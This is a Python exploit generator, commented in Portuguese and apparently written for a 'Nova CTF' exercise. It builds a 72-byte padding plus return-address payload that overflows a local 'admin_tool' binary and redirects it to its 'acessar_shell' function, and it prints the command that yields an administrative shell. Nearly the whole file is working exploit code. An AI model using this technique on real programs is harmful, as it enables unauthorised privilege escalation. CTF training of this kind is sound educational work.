#!/usr/bin/env python3
"""
Exploit Generator para Admin Tool - Nova CTF
============================================

Este script gera payloads para explorar a vulnerabilidade de buffer overflow
na ferramenta administrativa. Apenas para fins educativos!

Autor: Nova CTF Team
Vers√£o: 1.0
"""

import struct
import subprocess
import sys
import os

class ExploitGenerator:
    def __init__(self, binary_path="./admin_tool"):
        self.binary_path = binary_path
        self.target_function = "acessar_shell"
        self.buffer_size = 72  # Tamanho necess√°rio para sobrescrever o return address (64-bit)
        
    def get_function_address(self):
        """Obt√©m o endere√ßo da fun√ß√£o acessar_shell usando objdump"""
        try:
            result = subprocess.run(['objdump', '-t', self.binary_path], 
                                  capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if self.target_function in line:
                    # Extrai o endere√ßo (primeira coluna)
                    addr_str = line.split()[0]
                    return int(addr_str, 16)
            
            print(f"‚ùå Erro: Fun√ß√£o {self.target_function} n√£o encontrada!")
            return None
            
        except FileNotFoundError:
            print("‚ùå Erro: objdump n√£o encontrado. Instale binutils.")
            return None
        except Exception as e:
            print(f"‚ùå Erro ao obter endere√ßo: {e}")
            return None
    
    def generate_payload(self, target_addr):
        """Gera o payload de buffer overflow"""
        # Padding para preencher o buffer
        padding = b"A" * self.buffer_size
        
        # Endere√ßo da fun√ß√£o alvo (little-endian, 64-bit)
        ret_addr = struct.pack("<Q", target_addr)
        
        payload = padding + ret_addr
        return payload
    
    def generate_rop_chain(self, target_addr):
        """Gera uma ROP chain simples (para demonstra√ß√£o avan√ßada)"""
        # Para este exemplo, usamos apenas o endere√ßo direto
        # Em um cen√°rio real, voc√™ construiria uma chain mais complexa
        padding = b"A" * self.buffer_size
        
        # ROP Chain simples: apenas chama acessar_shell()
        rop_chain = struct.pack("<Q", target_addr)
        
        payload = padding + rop_chain
        return payload
    
    def create_exploit_command(self, payload):
        """Cria o comando completo para executar o exploit"""
        # Converte payload para string usando latin-1 (preserva bytes)
        payload_str = payload.decode('latin-1')
        command = f'{self.binary_path} "admin:{payload_str}"'
        return command
    
    def test_overflow(self):
        """Testa se o buffer overflow funciona (causa crash controlado)"""
        print("üß™ Testando buffer overflow...")
        
        # Payload simples para testar overflow
        test_payload = b"A" * (self.buffer_size + 8) + b"BBBBBBBB"
        command = self.create_exploit_command(test_payload)
        
        print(f"Comando de teste: {command}")
        print("‚ö†Ô∏è  Este comando deve causar um crash (segmentation fault)")
        
        return command
    
    def generate_full_exploit(self):
        """Gera o exploit completo"""
        print("üéØ GERADOR DE EXPLOIT - ADMIN TOOL")
        print("=" * 40)
        
        # Verifica se o bin√°rio existe
        if not os.path.exists(self.binary_path):
            print(f"‚ùå Bin√°rio n√£o encontrado: {self.binary_path}")
            print("üí° Execute 'make' para compilar primeiro")
            return None
        
        # Obt√©m o endere√ßo da fun√ß√£o alvo
        target_addr = self.get_function_address()
        if not target_addr:
            return None
        
        print(f"üéØ Endere√ßo de {self.target_function}: 0x{target_addr:08x}")
        
        # Gera o payload
        payload = self.generate_payload(target_addr)
        exploit_cmd = self.create_exploit_command(payload)
        
        print(f"üìù Payload gerado ({len(payload)} bytes)")
        print(f"üöÄ Comando do exploit:")
        print(f"   {exploit_cmd}")
        
        return exploit_cmd

def print_banner():
    """Imprime o banner do gerador"""
    print("""
üî• EXPLOIT GENERATOR - NOVA CTF üî•
==================================
  ‚ö†Ô∏è  APENAS PARA FINS EDUCATIVOS  ‚ö†Ô∏è
==================================
    """)

def print_help():
    """Imprime ajuda de uso"""
    print("""
Uso: python3 exploit_generator.py [op√ß√£o]

Op√ß√µes:
  generate    - Gera exploit completo (padr√£o)
  test        - Gera payload de teste para overflow
  address     - Mostra apenas o endere√ßo da fun√ß√£o
  help        - Mostra esta ajuda

Exemplos:
  python3 exploit_generator.py
  python3 exploit_generator.py generate
  python3 exploit_generator.py test
    """)

def main():
    print_banner()
    
    generator = ExploitGenerator()
    
    if len(sys.argv) < 2:
        action = "generate"
    else:
        action = sys.argv[1].lower()
    
    if action == "help" or action == "-h" or action == "--help":
        print_help()
    
    elif action == "test":
        print("üß™ MODO DE TESTE")
        print("-" * 20)
        cmd = generator.test_overflow()
        if cmd:
            print("\nüí° Para executar o teste:")
            print(f"   {cmd}")
    
    elif action == "address":
        addr = generator.get_function_address()
        if addr:
            print(f"üéØ Endere√ßo de acessar_shell: 0x{addr:08x}")
    
    elif action == "generate":
        print("üéØ MODO GERA√á√ÉO DE EXPLOIT")
        print("-" * 30)
        cmd = generator.generate_full_exploit()
        
        if cmd:
            print("\n" + "=" * 50)
            print("‚úÖ EXPLOIT PRONTO!")
            print("=" * 50)
            print("üíÄ Execute o comando acima para obter shell administrativa")
            print("‚ö†Ô∏è  Certifique-se de estar em um ambiente controlado!")
    
    else:
        print(f"‚ùå A√ß√£o inv√°lida: {action}")
        print("üí° Use 'python3 exploit_generator.py help' para ajuda")

if __name__ == "__main__":
    main()